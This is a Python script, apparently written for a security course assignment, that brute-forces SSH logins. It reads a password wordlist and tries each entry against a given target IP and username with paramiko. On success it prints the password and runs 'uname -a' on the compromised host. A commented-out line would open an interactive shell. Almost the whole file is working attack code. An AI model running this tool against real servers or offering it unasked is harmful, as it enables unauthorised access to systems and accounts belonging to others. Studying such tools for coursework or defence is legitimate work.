# SSH Brute-forcer
# 
# Command: sudo python3 sshBruteForcer.py <targetIP> <userName> <passwordFile>
#
# File name: sshBruteForcer.py


from datetime import datetime
import time
import paramiko
import sys
import socket
from pathlib import Path




# Define variables
author = "Jotham"
current_date = datetime.now().strftime("%d/%m/%Y")

# Display the output
print(f"Author: {author}")
print(f"Date: {current_date}")



# Read file and list passwords
def listPasswords(filepath):
	passwords = []
	
	with open(filepath, 'r') as passwordFile:
		for line in passwordFile:
			passwords.append(line.strip())
	
	return passwords
	



# Test
def test():
	# Test listPasswords()
	passwordFile = "/home/jotham/Desktop/Assignments/A1/passwordList.txt"
	passwords = listPasswords(passwordFile)
	
	print(passwords)	




# Define main
def main():
	# Current working directory
	script_dir = Path(__file__).resolve().parent
	
	
	# Take in user input
	targetIP = input("Enter target IP address: ").strip()
	user = input("Enter username: ").strip()
	passwordFilePath = input("Enter password file path: ").strip()
	
	# Create list of password
	passwords = listPasswords(passwordFilePath)
	
	
	
	connected = False
	
	# Attempt connection
	for passwd in passwords:
		
		# Create SSH session
		session = paramiko.SSHClient()
		
		# Set host key policy
		session.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		
		try:
			print(f"Trying {passwd}...")
			session.connect(hostname=targetIP, username=user, password=passwd, timeout=30, \
					banner_timeout=60, auth_timeout=60)
			
			# If reach here, auth success
			print(f"\nPassword found: {passwd}")
			connected = True
			break
			
		except paramiko.AuthenticationException:
			# If wrong password, try next
			time.sleep(1) 
			
			session.close()
			continue
		
		except (paramiko.SSHException, EOFError, socket.error) as e:
			print(f"Connection error for {passwd}: {e}")
			
			if "banner" in str(e):
				print("Target does not seem to be an SSH server. Exiting.")
				sys.exit(1)
				
			# Wait longer
			time.sleep(5)
			
			session.close()
			continue 
			
		except Exception as e:
			print(f"Unexpected error: {e}")
			
			session.close()
			sys.exit(1)
	
	
	# Check if connection is active
	if not connected:
		print("No valid password found")
		sys.exit(0)
	
	
	# Check transport
	
	
	# Now that we have aworking session, Test command execution of 'uname -a'
	try:
		# Delay the requests (give server time to respond)
		time.sleep(1)
		
		stdin, stdout, stderr = session.exec_command("uname -a")
		output = stdout.read().decode()
		
		print("Command output: ")
		print(output)
		
	except Exception as e:
		print(f"Warning: Could not execute command: {e}")
		
	
	'''		
	# Create interactive shell
	shell = session.invoke_shell()
	'''
	
	session.close()
	return
	
	
	
	
if __name__ == "__main__":
	main()
	#test()
